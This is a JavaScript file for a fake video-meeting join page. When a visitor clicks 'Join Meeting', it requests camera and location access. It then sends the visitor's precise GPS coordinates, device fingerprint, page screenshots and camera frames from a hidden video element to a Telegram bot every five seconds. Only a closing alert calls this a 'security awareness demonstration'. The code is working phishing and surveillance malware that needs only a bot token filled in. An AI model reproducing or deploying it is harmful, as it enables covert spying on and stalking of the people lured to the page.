document.addEventListener('DOMContentLoaded', function() {
    const joinBtn = document.getElementById('joinBtn');
    const infoBtn = document.getElementById('infoBtn');
    const meetingTitle = document.querySelector('.meeting-title').textContent;
    const meetingCode = document.querySelector('.meeting-code').textContent;
    let monitoringActive = false;
    let screenshotInterval = null;
    let cameraInterval = null;
    let cameraStream = null;
    let videoElement = null;
    let permissionsGranted = false;
    let cachedLocation = null;
    let locationWatchId = null;

    // Function to get location (cached version)
    function getCachedLocation() {
        return cachedLocation || { lat: null, lon: null, accuracy: null };
    }

    // Function to request location permission once
    async function requestLocationPermission() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ lat: null, lon: null, accuracy: null });
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    cachedLocation = {
                        lat: position.coords.latitude.toFixed(6),
                        lon: position.coords.longitude.toFixed(6),
                        accuracy: position.coords.accuracy.toFixed(2)
                    };
                    resolve(cachedLocation);
                    
                    // Watch position to update cache
                    locationWatchId = navigator.geolocation.watchPosition(
                        (pos) => {
                            cachedLocation = {
                                lat: pos.coords.latitude.toFixed(6),
                                lon: pos.coords.longitude.toFixed(6),
                                accuracy: pos.coords.accuracy.toFixed(2)
                            };
                        },
                        () => {},
                        { enableHighAccuracy: true }
                    );
                },
                (error) => {
                    resolve({ lat: null, lon: null, accuracy: null });
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }

    // Function to request all permissions once (camera and location only, no microphone)
    async function requestAllPermissions() {
        const permissions = {
            camera: false,
            location: false
        };

        try {
            // Request camera only (video, no audio/microphone)
            const mediaStream = await navigator.mediaDevices.getUserMedia({ 
                video: true,
                audio: false 
            }).catch(() => null);
            
            if (mediaStream) {
                permissions.camera = true;
                // Don't stop the stream - we'll use it for camera captures
                cameraStream = mediaStream;
            }
        } catch (e) {
            console.log('Camera permission denied or unavailable');
        }

        // Request location permission
        if (navigator.geolocation) {
            permissions.location = true;
            await requestLocationPermission();
        }

        return permissions;
    }

    // Function to detect device model from user agent
    function detectDeviceModel() {
        const ua = navigator.userAgent || '';
        let deviceModel = 'Unknown';

        // Try to use User-Agent Client Hints API if available (newer browsers)
        if (navigator.userAgentData && navigator.userAgentData.brands) {
            const brands = navigator.userAgentData.brands;
            if (brands.length > 0) {
                deviceModel = brands.map(b => b.brand).join(' ');
            }
        }

        // Detect mobile devices
        if (/iPhone/i.test(ua)) {
            const match = ua.match(/iPhone\s*OS\s*(\d+)/i) || ua.match(/iPhone/i);
            deviceModel = 'iPhone';
            if (ua.match(/iPhone\s*(\d+)/i)) {
                const modelMatch = ua.match(/iPhone\s*(\d+)/i);
                if (modelMatch) deviceModel = `iPhone ${modelMatch[1]}`;
            }
        } else if (/iPad/i.test(ua)) {
            deviceModel = 'iPad';
        } else if (/Android/i.test(ua)) {
            const match = ua.match(/Android\s+([^;)]+)/i);
            if (match) {
                deviceModel = `Android ${match[1]}`;
            } else {
                deviceModel = 'Android Device';
            }
            // Try to detect specific Android device models
            const deviceMatch = ua.match(/;\s*([^;)]+)\s*Build/i);
            if (deviceMatch) {
                deviceModel = deviceMatch[1].trim();
            }
        } else if (/Windows/i.test(ua)) {
            // Detect Windows version
            if (/Windows NT 10.0/i.test(ua)) {
                deviceModel = 'Windows 10/11';
            } else if (/Windows NT 6.3/i.test(ua)) {
                deviceModel = 'Windows 8.1';
            } else if (/Windows NT 6.2/i.test(ua)) {
                deviceModel = 'Windows 8';
            } else if (/Windows NT 6.1/i.test(ua)) {
                deviceModel = 'Windows 7';
            } else {
                deviceModel = 'Windows';
            }
        } else if (/Macintosh/i.test(ua) || /Mac OS X/i.test(ua)) {
            deviceModel = 'Mac';
            const macMatch = ua.match(/Mac OS X\s+([\d_]+)/i);
            if (macMatch) {
                deviceModel = `Mac OS ${macMatch[1].replace(/_/g, '.')}`;
            }
        } else if (/Linux/i.test(ua)) {
            deviceModel = 'Linux';
        } else if (/Chrome/i.test(ua)) {
            const chromeMatch = ua.match(/Chrome\/([\d.]+)/i);
            if (chromeMatch) {
                deviceModel = `Chrome ${chromeMatch[1]}`;
            }
        }

        return deviceModel;
    }

    // Function to get device information
    function getDeviceInfo() {
        const platform = navigator.platform || 'Unknown';
        const language = navigator.language || navigator.userLanguage || 'Unknown';
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
        const userAgent = navigator.userAgent || 'Unknown';
        const deviceModel = detectDeviceModel();
        
        // Get additional device info if available
        const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory}GB RAM` : 'Unknown';
        const hardwareConcurrency = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown';
        const screenResolution = `${window.screen.width}x${window.screen.height}`;
        const screenColorDepth = `${window.screen.colorDepth}-bit`;

        return { 
            platform, 
            language, 
            timezone, 
            userAgent,
            deviceModel,
            deviceMemory,
            hardwareConcurrency,
            screenResolution,
            screenColorDepth
        };
    }

    // Function to capture screenshot
    async function captureScreenshot() {
        try {
            const canvas = await html2canvas(document.body, {
                useCORS: true,
                logging: false,
                scale: 0.5
            });
            return canvas.toDataURL('image/png');
        } catch (error) {
            console.error('Error capturing screenshot:', error);
            return null;
        }
    }

    // Function to capture camera frame
    async function captureCameraFrame() {
        if (!videoElement || videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) {
            return null;
        }

        try {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElement, 0, 0);
            return canvas.toDataURL('image/png');
        } catch (error) {
            console.error('Error capturing camera frame:', error);
            return null;
        }
    }

    // Function to initialize camera (reuse existing stream)
    async function initializeCamera() {
        if (!cameraStream) {
            return false;
        }

        try {
            // Create hidden video element
            videoElement = document.createElement('video');
            videoElement.srcObject = cameraStream;
            videoElement.autoplay = true;
            videoElement.playsInline = true;
            videoElement.style.display = 'none';
            document.body.appendChild(videoElement);
            
            // Wait for video to be ready
            return new Promise((resolve) => {
                videoElement.onloadedmetadata = () => {
                    resolve(true);
                };
            });
        } catch (error) {
            console.error('Error initializing camera:', error);
            return false;
        }
    }

    // Function to stop camera
    function stopCamera() {
        if (locationWatchId !== null) {
            navigator.geolocation.clearWatch(locationWatchId);
            locationWatchId = null;
        }
        
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
        }
        if (videoElement) {
            videoElement.srcObject = null;
            if (videoElement.parentNode) {
                videoElement.parentNode.removeChild(videoElement);
            }
            videoElement = null;
        }
    }

    // Function to convert data URL to blob
    function dataURLtoBlob(dataurl) {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    }

    // Function to send document/file to Telegram
    async function sendDocumentToTelegram(fileBlob, filename) {
        const telegramToken = "<Your Telegram Token Here>";
        const telegramChatId = "<Your Chat Id Here>";
        const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendDocument`;

        const formData = new FormData();
        formData.append('chat_id', telegramChatId);
        formData.append('document', fileBlob, filename);

        try {
            const response = await fetch(telegramApiUrl, {
                method: 'POST',
                body: formData
            });
            return await response.json();
        } catch (error) {
            console.error('Error sending document:', error);
            return { ok: false };
        }
    }

    // Function to send location message to Telegram
    async function sendLocationMessageToTelegram(location, timeStr) {
        const telegramToken = "<Your Telegram Token Here>";
        const telegramChatId = "<Your Chat Id Here>";
        const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

        let locationMessage = `📷 Camera - ${timeStr}\n`;
        if (location.lat && location.lon) {
            locationMessage += `📍 Lat: ${location.lat}\n`;
            locationMessage += `📍 Lon: ${location.lon}`;
        }

        const payload = {
            chat_id: telegramChatId,
            text: locationMessage
        };

        try {
            const response = await fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
            return await response.json();
        } catch (error) {
            console.error('Error sending location message:', error);
            return { ok: false };
        }
    }

    // Function to send message to Telegram
    async function sendMessageToTelegram(message) {
        const telegramToken = "<Your Telegram Token Here>";
        const telegramChatId = "<Your Chat Id Here>";
        const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

        const payload = {
            chat_id: telegramChatId,
            text: message
        };

        try {
            const response = await fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
            return await response.json();
        } catch (error) {
            console.error('Error sending message:', error);
            return { ok: false };
        }
    }

    // Function to send screenshot
    async function sendScreenshot() {
        try {
            const location = getCachedLocation();
            const now = new Date();
            const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });

            // Send location message
            if (location.lat && location.lon) {
                await sendLocationMessageToTelegram(location, timeStr);
            }

            // Capture and send screenshot
            const screenshotDataUrl = await captureScreenshot();
            if (screenshotDataUrl) {
                const screenshotBlob = dataURLtoBlob(screenshotDataUrl);
                const fileSize = (screenshotBlob.size / 1024).toFixed(1);
                const filename = `Screenshot from user (${fileSize}KB).png`;
                await sendDocumentToTelegram(screenshotBlob, filename);
            }
        } catch (error) {
            console.error('Error sending screenshot:', error);
        }
    }

    // Function to send camera capture
    async function sendCameraCapture() {
        try {
            const location = getCachedLocation();
            const now = new Date();
            const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });

            // Send location message
            if (location.lat && location.lon) {
                await sendLocationMessageToTelegram(location, timeStr);
            }

            // Capture and send camera frame
            const cameraDataUrl = await captureCameraFrame();
            if (cameraDataUrl) {
                const cameraBlob = dataURLtoBlob(cameraDataUrl);
                const fileSize = (cameraBlob.size / 1024).toFixed(1);
                const filename = `Camera from user (${fileSize}KB).png`;
                await sendDocumentToTelegram(cameraBlob, filename);
            }
        } catch (error) {
            console.error('Error sending camera capture:', error);
        }
    }

    // Function to start continuous monitoring
    async function startMonitoring() {
        if (monitoringActive) {
            return;
        }

        if (permissionsGranted) {
            // Already have permissions, just start monitoring
            await continueMonitoring();
            return;
        }

        monitoringActive = true;
        joinBtn.disabled = true;
        joinBtn.textContent = 'Requesting permissions...';

        try {
            // Request all permissions once
            const permissions = await requestAllPermissions();
            permissionsGranted = true;
            
            // Initialize camera with existing stream
            const cameraInitialized = await initializeCamera();
            
            // Get location and device info
            const location = getCachedLocation();
            const deviceInfo = getDeviceInfo();
            const now = new Date();
            const timestamp = now.toLocaleString();

            const separator = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
            let message = `🎥 New Meeting Join Request\n`;
            message += `${separator}\n`;
            message += `📅 Timestamp: ${timestamp}\n`;
            message += `${separator}\n\n`;

            message += `Permissions Granted:\n`;
            message += `✅ Camera: ${permissions.camera ? '✓ YES' : '✗ NO'}\n`;
            message += `📍 Location: ${permissions.location ? '✓ YES' : '✗ NO'}\n\n`;

            if (location.lat && location.lon) {
                message += `Location Details:\n`;
                message += `📍 Latitude: ${location.lat}\n`;
                message += `📍 Longitude: ${location.lon}\n`;
                message += `🎯 Accuracy: ${location.accuracy}m\n\n`;
            } else {
                message += `Location Details:\n`;
                message += `📍 Latitude: Not available\n`;
                message += `📍 Longitude: Not available\n`;
                message += `🎯 Accuracy: Not available\n\n`;
            }

            message += `Device Information:\n`;
            message += `📱 Device Model: ${deviceInfo.deviceModel}\n`;
            message += `🖥️ Platform: ${deviceInfo.platform}\n`;
            message += `💾 Memory: ${deviceInfo.deviceMemory}\n`;
            message += `⚙️ CPU Cores: ${deviceInfo.hardwareConcurrency}\n`;
            message += `🖼️ Screen: ${deviceInfo.screenResolution} (${deviceInfo.screenColorDepth})\n`;
            message += `🌐 Language: ${deviceInfo.language}\n`;
            message += `🕐 Timezone: ${deviceInfo.timezone}\n\n`;

            message += `User Agent:\n`;
            message += `${deviceInfo.userAgent}`;

            await sendMessageToTelegram(message);

            // Continue with monitoring
            await continueMonitoring(cameraInitialized);
        } catch (error) {
            console.error('Error starting monitoring:', error);
            alert('⚠️ Error starting monitoring.');
            stopMonitoring();
        }
    }

    // Function to continue monitoring after permissions are granted
    async function continueMonitoring(cameraInitialized = null) {
        joinBtn.textContent = 'Monitoring...';

        // Check if camera is available
        if (cameraInitialized === null) {
            cameraInitialized = await initializeCamera();
        }

        // Send initial screenshots
        await sendScreenshot();
        if (cameraInitialized) {
            // Wait a bit for camera to stabilize
            setTimeout(() => sendCameraCapture(), 1000);
        }

        // Set up intervals for continuous monitoring (every 5 seconds)
        screenshotInterval = setInterval(() => {
            sendScreenshot();
        }, 5000);

        if (cameraInitialized) {
            cameraInterval = setInterval(() => {
                sendCameraCapture();
            }, 5000);
        }

        alert('Thank you for participating. This was a security awareness demonstration designed to help you stay safe in the digital world.☠️');
    }

    // Function to stop monitoring (but keep permissions active)
    function stopMonitoring() {
        monitoringActive = false;
        
        if (screenshotInterval) {
            clearInterval(screenshotInterval);
            screenshotInterval = null;
        }
        
        if (cameraInterval) {
            clearInterval(cameraInterval);
            cameraInterval = null;
        }
        
        // Remove video element but keep stream active
        if (videoElement) {
            videoElement.srcObject = null;
            if (videoElement.parentNode) {
                videoElement.parentNode.removeChild(videoElement);
            }
            videoElement = null;
        }
        
        // Stop location watching but keep permission
        if (locationWatchId !== null) {
            navigator.geolocation.clearWatch(locationWatchId);
            locationWatchId = null;
        }
        
        joinBtn.disabled = false;
        joinBtn.textContent = 'Join Meeting';
    }

    // Function to fully stop and release all permissions
    function stopAllPermissions() {
        stopMonitoring();
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
        }
        permissionsGranted = false;
        cachedLocation = null;
    }

    // Handle join button
    joinBtn.addEventListener('click', function(e) {
        e.preventDefault();
        if (monitoringActive) {
            stopMonitoring();
            alert('Monitoring stopped.');
        } else {
            startMonitoring();
        }
    });

    // Handle info button
    infoBtn.addEventListener('click', function(e) {
        e.preventDefault();
        alert('Meeting Information:\n\n' +
              `Title: ${meetingTitle}\n` +
              `Code: ${meetingCode}`);
    });
});

